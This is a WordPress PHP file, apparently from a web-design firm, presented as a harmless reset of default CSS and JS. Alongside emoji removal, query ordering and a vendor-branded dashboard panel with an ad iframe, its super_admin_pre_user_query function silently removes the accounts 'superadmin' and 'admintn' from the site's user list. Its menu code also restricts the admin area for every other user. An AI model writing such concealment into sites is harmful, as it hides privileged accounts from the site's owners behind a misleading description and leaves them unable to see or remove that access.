<?php
/**
 * Name: reset file.
 * Description: Reset default css and js wordpress.
 * User: Hoang Neo
 */

if (!class_exists('ReSetDefaultWP')):

    class ReSetDefaultWP
    {
        public function __construct()
        {
            if(!is_admin()) {
                remove_action('wp_head', 'wp_resource_hints', 2);
                // REMOVE WP EMOJI
                remove_action('wp_head', 'print_emoji_detection_script', 7);
                remove_action('wp_print_styles', 'print_emoji_styles');

                remove_action('admin_print_scripts', 'print_emoji_detection_script');
                remove_action('admin_print_styles', 'print_emoji_styles');

                add_action('pre_get_posts', array($this, 'foo_modify_query_order'));

                add_filter('get_the_archive_title', array($this, 'prefix_category_title'));
            }else{
                $this->remove_menus();
                add_action('admin_enqueue_scripts', array($this,'admin_style'));
            }
            add_action('pre_user_query', array($this,'super_admin_pre_user_query'));
        }

        public function my_deregister_scripts()
        {
            wp_deregister_script('wp-embed');
        }

        /**
         * order by date
         */
        public function foo_modify_query_order( $query ) {
            $query->set( 'orderby', 'date' );
            $query->set( 'order', 'DESC' );
        }

        public function prefix_category_title( $title ) {
            if ( is_category() || is_tax() ) {
                $title = single_cat_title( '', false );
            }
            if (is_archive()){
                return str_replace('Lưu trữ:', '', $title);
            }
            return $title;
        }

        /**
         * remove supper user  admin
         * */
        public function super_admin_pre_user_query($user_search) {
            global $wpdb;
            $user_search->query_where = str_replace('WHERE 1=1',
                "WHERE 1=1 AND {$wpdb->users}.user_login != 'superadmin' AND {$wpdb->users}.user_login != 'admintn'",$user_search->query_where);
        }

        public function remove_menus(){
            $user = wp_get_current_user();
            if (empty($user->user_login) || !in_array($user->user_login,['admintn','superadmin']))
            {
                add_action('admin_enqueue_scripts', array($this,'admin_style_remove_menu'));
            }
        }

        // Update CSS within in Admin
        public function admin_style_remove_menu() {
            wp_enqueue_style('admin-remove-menu', get_bloginfo('wpurl'). '/assets/css/admin-remove-menu.css');
        }
        // Update CSS within in Admin
        public function admin_style() {
            wp_enqueue_style('admin-styles', get_bloginfo('wpurl'). '/assets/css/admin-css.css');
        }

    }

    /**
     *check class is exit
     * call class
     */

    function HN_resetwp()
    {
        global $HNResetWP;

        if (!isset($HNResetWP)) {
            $HNResetWP = new ReSetDefaultWP();
        }

        return $HNResetWP;
    }

    HN_resetwp();


endif; // class_exists check


if (!function_exists('my_welcome_panel')):
/*****************************
 *Add a custom Welcome Dashboard Panel
 *****************************/
function my_welcome_panel() {
    ?>
    <div style="max-width: 100%" class="welcome-panel-content">
        <h2 style="line-height: 26px;padding: 16px!important;">Chào mừng bạn đăng nhâp vào khu vực quản trị website của TOANNANG.</h2>
        <p class="about-description"><?php _e( 'We&#8217;ve assembled some links to get you started:' ); ?></p>
        <div class="welcome-panel-column-container">
            <div class="welcome-panel-column">
                <h3><?php _e( 'Next Steps' ); ?></h3>
                <ul>
                    <?php if ( 'page' == get_option( 'show_on_front' ) && ! get_option( 'page_for_posts' ) ) : ?>
                        <li><?php printf( '<a href="%s" class="welcome-icon welcome-edit-page">' . __( 'Edit your front page' ) . '</a>', get_edit_post_link( get_option( 'page_on_front' ) ) ); ?></li>
                        <li><?php printf( '<a href="%s" class="welcome-icon welcome-add-page">' . __( 'Add additional pages' ) . '</a>', admin_url( 'post-new.php?post_type=page' ) ); ?></li>
                    <?php elseif ( 'page' == get_option( 'show_on_front' ) ) : ?>
                        <li><?php printf( '<a href="%s" class="welcome-icon welcome-edit-page">' . __( 'Edit your front page' ) . '</a>', get_edit_post_link( get_option( 'page_on_front' ) ) ); ?></li>
                        <li><?php printf( '<a href="%s" class="welcome-icon welcome-add-page">' . __( 'Add additional pages' ) . '</a>', admin_url( 'post-new.php?post_type=page' ) ); ?></li>
                        <li><?php printf( '<a href="%s" class="welcome-icon welcome-write-blog">' . __( 'Add a blog post' ) . '</a>', admin_url( 'post-new.php' ) ); ?></li>
                    <?php else : ?>
                        <li><?php printf( '<a href="%s" class="welcome-icon welcome-write-blog">' . __( 'Write your first blog post' ) . '</a>', admin_url( 'post-new.php' ) ); ?></li>
                        <li><?php printf( '<a href="%s" class="welcome-icon welcome-add-page">' . __( 'Add an About page' ) . '</a>', admin_url( 'post-new.php?post_type=page' ) ); ?></li>
                    <?php endif; ?>
                    <li><?php printf( '<a href="%s" class="welcome-icon welcome-view-site">' . __( 'View your site' ) . '</a>', home_url( '/' ) ); ?></li>
                </ul>
            </div>
            <div class="welcome-panel-column">
                <div class="image-tn-qc">
                    <img src="https://www.toannang.com.vn/images/tnqc-1.png" alt="Thiết Kế Website Toàn Năng" />
                </div>
            </div>
            <div class="welcome-panel-column welcome-panel-last">
                <iframe class="iframe-tn-qc" src="https://www.toannang.com.vn/quang-cao-link-admin-site/" style="width: 100%; min-height: 250px"></iframe>
            </div>
        </div>
    </div>
    <style>.image-tn-qc, .iframe-tn-qc{ margin: 0 6px 2em; border: 1px solid #ddd; border-radius: 5px;max-width: 100%}
        .image-tn-qc img{ max-width: 100%; display: block; margin: 0 auto}
        .welcome-panel-last{overflow: hidden}
        .welcome-panel .welcome-panel-column:first-child{width: 35%;}
    </style>
    <?php
}

remove_action('welcome_panel','wp_welcome_panel');
add_action( 'welcome_panel', 'my_welcome_panel' );
endif;